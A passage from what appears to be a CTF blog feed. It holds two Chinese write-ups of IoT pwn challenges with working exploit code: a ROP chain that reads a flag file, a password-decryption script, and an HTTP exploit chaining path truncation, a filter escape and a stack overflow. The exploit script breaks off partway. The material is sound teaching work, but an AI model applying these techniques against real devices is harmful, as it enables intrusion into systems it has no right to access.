param=0x1337)</span><br><span class="line">   ↓</span><br><span class="line">   暴力破解 magic_table[0..7]</span><br><span class="line">   ↓</span><br><span class="line">4. oracle_leak (CMD_EXEC_OP)</span><br><span class="line">   ↓</span><br><span class="line">   泄露栈地址、堆地址、canary</span><br><span class="line">   ↓</span><br><span class="line">5. CMD_EXEC_OP (param=0x42, op_code=0x41)</span><br><span class="line">   ↓</span><br><span class="line">   触发栈溢出</span><br><span class="line">   ↓</span><br><span class="line">6. ROP Chain执行</span><br><span class="line">   ↓</span><br><span class="line">   获取Shell</span><br></pre></td></tr></table></figure><p>题目开了沙箱，禁用了 exec，由于我们无法直接和 server 交互，所以不能用常规的 orw 来读 flag</p><p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/08d13cc9dff62129e50f499d48dac584.png"></p><p>结合 client 程序在启动的时候会读取并输出 client.log 的文件内容，可以把 flag 内容写入到 client.log 文件，rop 执行之后，再启动一个终端 nc 就能拿到 flag</p><p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/e073a3b7a4b6fb91b42c72b0331f718b.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwnkit <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnkit.osys.linux.ropbox <span class="keyword">import</span> GadgetBox</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">args = init_pwn_args()</span><br><span class="line">binary = ELF(<span class="string">&quot;./bin/server&quot;</span>)</span><br><span class="line">args.info.binary = context.binary = binary</span><br><span class="line">args.info.target = &#123;<span class="string">&quot;host&quot;</span>: args.host <span class="keyword">or</span> <span class="string">&quot;example.pwnme&quot;</span>, <span class="string">&quot;port&quot;</span>: args.port <span class="keyword">or</span> <span class="number">9999</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.remote:</span><br><span class="line">    _host, _port = gift.dbgsrv.init()</span><br><span class="line">    host, port = <span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span></span><br><span class="line">    pk.core.config.config_context_terminal()</span><br><span class="line"></span><br><span class="line">p = pwntube(args) <span class="keyword">if</span> args.remote <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">cmd</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">run(<span class="string">b&quot;hello&quot;</span>)</span><br><span class="line">run(<span class="string">b&quot;oracle_unlock&quot;</span>)</span><br><span class="line">run(<span class="string">b&quot;register aaa&quot;</span>)</span><br><span class="line">run(<span class="string">b&quot;list&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;count=&quot;</span>)</span><br><span class="line">num = <span class="built_in">int</span>(p.recvline())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">    idx = p.recvline().strip()[<span class="number">2</span>:]</span><br><span class="line">    idx = <span class="built_in">int</span>(idx)</span><br><span class="line">log.info(<span class="string">&quot;latest idx: %d&quot;</span>, idx)</span><br><span class="line"></span><br><span class="line">run(<span class="string">f&quot;oracle_leak <span class="subst">&#123;idx&#125;</span> 8&quot;</span>.encode())</span><br><span class="line">p.recvuntil(<span class="string">b&quot;addr=&quot;</span>)</span><br><span class="line">text_leak = p.recvline().strip()</span><br><span class="line">text_leak = <span class="built_in">int</span>(text_leak, <span class="number">16</span>)</span><br><span class="line">text_base = text_leak - <span class="number">0x2e60</span></span><br><span class="line">plog.address(text_leak=text_leak, text_base=text_base)</span><br><span class="line"></span><br><span class="line">gb = GadgetBox(binary)</span><br><span class="line">pop_rdi_ret = text_base + <span class="built_in">next</span>(gb.search_gadget([<span class="string">&quot;pop rdi&quot;</span>, <span class="string">&quot;ret&quot;</span>]))</span><br><span class="line">pop_rsi_r15_ret = text_base + <span class="built_in">next</span>(gb.search_gadget([<span class="string">&quot;pop rsi&quot;</span>, <span class="string">&quot;pop r15&quot;</span>, <span class="string">&quot;ret&quot;</span>]))</span><br><span class="line">add_edx_edi_ret = text_base + <span class="number">0x2a94</span>  <span class="comment"># 0x0000000000002a94: add edx, edi; nop; ret;</span></span><br><span class="line">add_rsp_0xc0_ret = text_base + <span class="number">0x2a84</span>  <span class="comment"># 0x0000000000002a84: add rsp, 0xc0; ret;</span></span><br><span class="line">open_addr = text_base + binary.plt[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read_addr = text_base + binary.plt[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_addr = text_base + binary.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; open/read/write rop &quot;&quot;&quot;</span></span><br><span class="line">path_flag = text_base + <span class="number">0xc000</span> + <span class="number">0x10</span></span><br><span class="line">path_log = path_flag + <span class="number">15</span></span><br><span class="line">buf = text_base + <span class="number">0xc000</span> + <span class="number">0x100</span>  <span class="comment"># read buf</span></span><br><span class="line">size = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;/home/ctf/flag\x00&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;/home/ctf/client.log\x00&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">64</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(add_rsp_0xc0_ret)</span><br><span class="line"><span class="comment"># int fs = open(path, O_RDONLY, NULL)</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(path_flag)  <span class="comment"># rdi = &quot;/path/to/flag&quot;</span></span><br><span class="line">payload += p64(pop_rsi_r15_ret) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)  <span class="comment"># rsi = 0 == O_RDONLY</span></span><br><span class="line">payload += p64(open_addr)</span><br><span class="line"><span class="comment"># int fs = open(path, O_RWONLY, NULL)</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(path_log)  <span class="comment"># rdi = &quot;/path/to/flag&quot;</span></span><br><span class="line">payload += p64(pop_rsi_r15_ret) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>)  <span class="comment"># rsi = 0 == O_RDONLY</span></span><br><span class="line">payload += p64(open_addr)</span><br><span class="line"><span class="comment"># read(fs, buf, size)</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0x100</span>) + p64(add_edx_edi_ret)  <span class="comment"># edx = 0x100</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">5</span>)  <span class="comment"># rdi = fs</span></span><br><span class="line">payload += p64(pop_rsi_r15_ret) + p64(buf) + p64(<span class="number">0</span>)  <span class="comment"># rsi = buf</span></span><br><span class="line">payload += p64(read_addr)</span><br><span class="line"><span class="comment"># write(1, buf, size)</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">6</span>)  <span class="comment"># rdi = fs</span></span><br><span class="line">payload += p64(pop_rsi_r15_ret) + p64(buf) + p64(<span class="number">0</span>)  <span class="comment"># rsi = buf</span></span><br><span class="line">payload += p64(write_addr)</span><br><span class="line">data = p8(<span class="number">0x41</span>) + p32(<span class="built_in">len</span>(payload)) + payload</span><br><span class="line">run(<span class="string">f&quot;exechex <span class="subst">&#123;idx&#125;</span> 2 <span class="subst">&#123;binascii.hexlify(data).decode()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/d9edc69b6c9a9614510a1f0f26be852e.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>整个复现过程，基本上只有 rop 是自己写的，绝大部分的分析过程都是 AI 做的，人工主要是测功能和指导 AI 的分析方向。目前 AI 针对一些比较小的程序，分析效果还是不错的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本文进行一次利用 AI 从没看到独立复现 2 解题目的尝试，这里分享一下思路。题目本身的主要难度在逆向层面，需要分析每一个指令的参数和功能，</summary>
      
    
    
    
    <category term="Write Up" scheme="https://the-soloist.github.io/category/Write-Up/"/>
    
    
    <category term="CTF" scheme="https://the-soloist.github.io/tag/CTF/"/>
    
    <category term="AI" scheme="https://the-soloist.github.io/tag/AI/"/>
    
  </entry>
  
  <entry>
    <title>第八届“强网”拟态防御国际精英挑战赛 初赛 Write Up：WIN！致敬 mt</title>
    <link href="https://the-soloist.github.io/2025/10/29/2025-qwnt-quals-iot1-wp/"/>
    <id>https://the-soloist.github.io/2025/10/29/2025-qwnt-quals-iot1-wp/</id>
    <published>2025-10-29T14:38:28.000Z</published>
    <updated>2025-12-17T15:05:33.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>启动脚本只开放了一个 80 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> qemu-system-arm \</span><br><span class="line">  -M versatilepb \</span><br><span class="line">  -m 256 \</span><br><span class="line">  -kernel vmlinuz-3.2.0-4-versatile \</span><br><span class="line">  -initrd initrd.img-3.2.0-4-versatile \</span><br><span class="line">  -hda debian_wheezy_armel_standard.qcow2 \</span><br><span class="line">  -append <span class="string">&quot;root=/dev/sda1 console=ttyAMA0&quot;</span> \</span><br><span class="line">  -net nic -net user,hostfwd=tcp::80-:80 \</span><br><span class="line">  -nographic</span><br></pre></td></tr></table></figure><p>先挂载 qcow 文件，提取文件系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加载网络块设备模块</span></span><br><span class="line"><span class="built_in">sudo</span> modprobe nbd max_part=8</span><br><span class="line"><span class="comment"># 连接 qcow2 镜像到 nbd 设备</span></span><br><span class="line"><span class="built_in">sudo</span> qemu-nbd -c /dev/nbd0 your_image.qcow2</span><br><span class="line"><span class="comment"># 查看分区信息</span></span><br><span class="line"><span class="built_in">sudo</span> fdisk -l /dev/nbd0</span><br><span class="line"><span class="comment"># 挂载分区</span></span><br><span class="line"><span class="built_in">sudo</span> mount /dev/nbd0p1 /mnt</span><br><span class="line"><span class="comment"># 访问文件系统内容</span></span><br><span class="line"><span class="built_in">ls</span> /mnt</span><br><span class="line"><span class="comment"># 卸载与断开</span></span><br><span class="line"><span class="built_in">sudo</span> umount /mnt</span><br><span class="line"><span class="built_in">sudo</span> qemu-nbd -d /dev/nbd0</span><br></pre></td></tr></table></figure><p>启动后看到 lighttpd 进程，&#x2F;var&#x2F;www 是 web 服务的根目录</p><p><img src="/2025/10/29/2025-qwnt-quals-iot1-wp/.././2025-qwnt-quals-iot1-wp/image-20251101182211026.png" alt="image-20251101182211026"></p><p><img src="/2025/10/29/2025-qwnt-quals-iot1-wp/.././2025-qwnt-quals-iot1-wp/image-20251101182214602.png" alt="image-20251101182214602"></p><h1 id="CGI-分析"><a href="#CGI-分析" class="headerlink" title="CGI 分析"></a>CGI 分析</h1><p>先来分析下每个 cgi 的功能</p><h2 id="auth-cgi"><a href="#auth-cgi" class="headerlink" title="auth.cgi"></a>auth.cgi</h2><p>index 在登录的时候往 auth.cgi 发送 POST 请求</p><p><img src="/2025/10/29/2025-qwnt-quals-iot1-wp/.././2025-qwnt-quals-iot1-wp/image-20251101182219628.png" alt="image-20251101182219628"></p><p>先对 password 进行了加密，然后和&#x2F;tmp&#x2F;store&#x2F;users.txt 文件中的密文进行对比</p><p><img src="/2025/10/29/2025-qwnt-quals-iot1-wp/.././2025-qwnt-quals-iot1-wp/image-20251101182223887.png" alt="image-20251101182223887"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@debian-armel:/tmp/store# <span class="built_in">cat</span> users.txt</span><br><span class="line">admin:dlZ4bWFsdjUDaiYCeCUqfGYUEhBvFW97dmtxcA==</span><br></pre></td></tr></table></figure><p>ai 写一个解密脚本，得到 admin 账号的密码是 8g323##a08h33zx33@!B!$$$$$$$</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 users.txt 读取的密文</span></span><br><span class="line">encrypted_password = <span class="string">&quot;dlZ4bWFsdjUDaiYCeCUqfGYUEhBvFW97dmtxcA==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># XOR 密钥 (从代码中的 aN1kRout3r 找到)</span></span><br><span class="line">key = <span class="string">&quot;N1K_ROUT3R&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: Base64 解码</span></span><br><span class="line">decoded = base64.b64decode(encrypted_password)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Base64 decoded bytes: <span class="subst">&#123;decoded.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Length: <span class="subst">&#123;<span class="built_in">len</span>(decoded)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: XOR 解密</span></span><br><span class="line">password = <span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(decoded)):</span><br><span class="line">    <span class="comment"># 使用循环密钥进行 XOR</span></span><br><span class="line">    xor_byte = decoded[i] ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])</span><br><span class="line">    password.append(xor_byte)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试解码为字符串</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    decrypted_password = password.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nDecrypted password: <span class="subst">&#123;decrypted_password&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nDecrypted password (hex): <span class="subst">&#123;password.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Decrypted password (raw bytes): <span class="subst">&#123;<span class="built_in">bytes</span>(password)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>登录之后的后台界面</p><p><img src="/2025/10/29/2025-qwnt-quals-iot1-wp/.././2025-qwnt-quals-iot1-wp/image-20251101182235151.png" alt="image-20251101182235151"></p><h2 id="upload-cgi"><a href="#upload-cgi" class="headerlink" title="upload.cgi"></a>upload.cgi</h2><p>actions：</p><ul><li>fake_upload：一个假的上传接口</li><li>download：根据 path 参数，读取文件内容，但限制了文件最后几个字节是 nik.gif 和黑白名单检测</li><li>upload_pubkey：根据 filecontent 的内容往&#x2F;tmp&#x2F;store&#x2F;publicfile.txt 写入内容</li></ul><h2 id="manage-cgi"><a href="#manage-cgi" class="headerlink" title="manage.cgi"></a>manage.cgi</h2><p>actions：</p><ul><li>status&#x2F;dashboard：无实际功能</li><li>viewconf：读&#x2F;tmp&#x2F;store&#x2F;config.txt 文件的前 0x1000 字节</li><li>logs：读&#x2F;tmp&#x2F;store&#x2F;logs.txt 文件的前 0x2000 字节</li><li>diag：限制 cmd&#x3D;&#x3D;df</li><li>ping：限制 ip&#x3D;&#x3D;127.0.0.1</li><li>speedtest：无实际功能</li><li>logout：无实际功能</li><li>id：读&#x2F;tmp&#x2F;store&#x2F;id.txt 文件的前 0x100 字节</li><li>dump_payload：hex dump dword_13484 的内容</li><li>id_save：将 id_val 的值写入&#x2F;tmp&#x2F;store&#x2F;id.txt 文件</li><li>set_publicfile：将&#x2F;tmp&#x2F;store&#x2F;publicfile.txt 的内容十六进制转 bytes，过滤字符后，根据 cnt1 和 cnt2 将指定字节写入 dword_13484[cnt2]</li></ul><h2 id="watch"><a href="#watch" class="headerlink" title="watch"></a>watch</h2><p>往&#x2F;tmp&#x2F;rootkey 文件里写随机字节</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="root-功能的负数溢出-栈溢出"><a href="#root-功能的负数溢出-栈溢出" class="headerlink" title="root 功能的负数溢出+栈溢出"></a>root 功能的负数溢出+栈溢出</h2><p>manage.cgi 当传入 rk 参数的时候，会调用 rook 功能的后门函数</p><p><img src="/2025/10/29/2025-qwnt-quals-iot1-wp/.././2025-qwnt-quals-iot1-wp/image-20251101182247207.png" alt="image-20251101182247207"></p><p><img src="/2025/10/29/2025-qwnt-quals-iot1-wp/.././2025-qwnt-quals-iot1-wp/image-20251101182251909.png" alt="image-20251101182251909"></p><p>功能将&#x2F;tmp&#x2F;store&#x2F;id.txt 文件的内容，转换成整数，然后从 dword_13484 中拷贝 size 大小的数据到栈上。由于 size 是有符号比较，负数的时候可以绕过检查，拷贝一块巨大的内容到栈上。buf[(size ^ 0x13) &amp; 1])实际上调用的还是 xor_decrypt_data，然后 size 作为 memcpy 参数进行拷贝。</p><p><img src="/2025/10/29/2025-qwnt-quals-iot1-wp/.././2025-qwnt-quals-iot1-wp/image-20251101182324427.png" alt="image-20251101182324427"></p><p><img src="/2025/10/29/2025-qwnt-quals-iot1-wp/.././2025-qwnt-quals-iot1-wp/image-20251101182327793.png" alt="image-20251101182327793"></p><p><img src="/2025/10/29/2025-qwnt-quals-iot1-wp/.././2025-qwnt-quals-iot1-wp/image-20251101182331075.png" alt="image-20251101182331075"></p><h2 id="路径截断"><a href="#路径截断" class="headerlink" title="路径截断"></a>路径截断</h2><p>upload.cgi 的 action&#x3D;download 中，snprintf 只保存了 0x60 字节，之后的内容会被截断，所以我们可以构造.&#x2F;.&#x2F;XXXXX.&#x2F;rootKeynik.gif 绕过检查，读取&#x2F;tmp&#x2F;rootkey</p><p><img src="/2025/10/29/2025-qwnt-quals-iot1-wp/.././2025-qwnt-quals-iot1-wp/image-20251101182334226.png" alt="image-20251101182334226"></p><h2 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h2><p>manage.cgi 的 set_publicfile 功能，会过滤&#x2F;tmp&#x2F;store&#x2F;publicfile.txt 文件中的字符，然后根据 cnt1 和 cnt2 参数，向 dword_13484 中写入一个字节。</p><p><img src="/2025/10/29/2025-qwnt-quals-iot1-wp/.././2025-qwnt-quals-iot1-wp/image-20251101182348221.png" alt="image-20251101182348221"></p><p>在字符过滤功能中，当 v21 等于 80 的时候会不经过过滤直接拷贝到 v35[81]，导致单字节逃逸。</p><p><img src="/2025/10/29/2025-qwnt-quals-iot1-wp/.././2025-qwnt-quals-iot1-wp/image-20251101182352613.png" alt="image"><br><img src="/2025/10/29/2025-qwnt-quals-iot1-wp/.././2025-qwnt-quals-iot1-wp/image-20251101182357358.png" alt="image-20251101182357358"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>整理一下利用思路：</p><ol><li>解密 admin 密码后，调用 watch 创建 rootKey 文件</li><li>利用 upload_pubkey 和 set_publicfile 逐字节往 dword_13484 中写入 payload<ul><li>manage.cgi 中将 dword_13484 映射到了共享内存，可以作为 cmd 参数的地址</li></ul></li><li>执行 root_key 功能将 dword_13484 的数据写到栈上，劫持控制流，执行 cat &#x2F;home&#x2F;ctf&#x2F;flag &gt; &#x2F;tmp&#x2F;store&#x2F;logs.txt</li><li>利用 logs 功能输出 flag 内容</li></ol><p>由于题目没有随机化，所以不需要泄露，直接执行 system 把 flag 重定向到 logs.txt 然后通过 action&#x3D;logs 读取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwnkit <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">args = init_pwn_args()</span><br><span class="line">binary = ELF(<span class="string">&quot;./rootfs/usr/sbin/lighttpd&quot;</span>)</span><br><span class="line">args.info.binary = context.binary = binary</span><br><span class="line">args.info.target = &#123;<span class="string">&quot;host&quot;</span>: args.host <span class="keyword">or</span> <span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;port&quot;</span>: args.port <span class="keyword">or</span> <span class="number">80</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.remote:</span><br><span class="line">    _host, _port = gift.dbgsrv.init()</span><br><span class="line">    host, port = <span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">80</span></span><br><span class="line">    pk.core.config.config_context_terminal()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    host, port = args.info.target[<span class="string">&quot;host&quot;</span>], args.info.target[<span class="string">&quot;port&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; &gt;&gt;&gt; exploit goes here &lt;&lt;&lt; &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># p = pwntube(args) if args.remote else remote(host, _port)</span></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">username, password</span>):</span><br><span class="line">    url = <span class="string">f&quot;http://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>/cgi-bin/auth.cgi&quot;</span></span><br><span class="line">    resp = session.post(url, data=&#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password&#125;, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(resp.cookies, resp.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">watch</span>():</span><br><span class="line">    url = <span class="string">f&quot;http://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>/cgi-bin/watch&quot;</span></span><br><span class="line">    resp = session.get(url)</span><br><span class="line">    <span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="comment"># print(path)</span></span><br><span class="line">    url = <span class="string">f&quot;http://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>/cgi-bin/upload.cgi?action=download&amp;path=<span class="subst">&#123;path&#125;</span>&quot;</span></span><br><span class="line">    resp = session.get(url)</span><br><span class="line">    <span class="built_in">print</span>(resp.text)</span><br><span class="line">    <span class="keyword">return</span> resp.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_pubkey</span>(<span class="params">content</span>):</span><br><span class="line">    url = <span class="string">f&quot;http://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>/cgi-bin/upload.cgi&quot;</span></span><br><span class="line">    resp = session.post(url, data=&#123;<span class="string">&quot;action&quot;</span>: <span class="string">&quot;upload_pubkey&quot;</span>, <span class="string">&quot;filecontent&quot;</span>: content&#125;)</span><br><span class="line">    <span class="comment"># print(resp.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">id_save</span>(<span class="params">id_val</span>):</span><br><span class="line">    url = <span class="string">f&quot;http://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>/cgi-bin/manage.cgi&quot;</span></span><br><span class="line">    <span class="comment"># print(url)</span></span><br><span class="line">    resp = session.post(url, data=&#123;<span class="string">&quot;action&quot;</span>: <span class="string">&quot;id_save&quot;</span>, <span class="string">&quot;id_val&quot;</span>: id_val&#125;)</span><br><span class="line">    <span 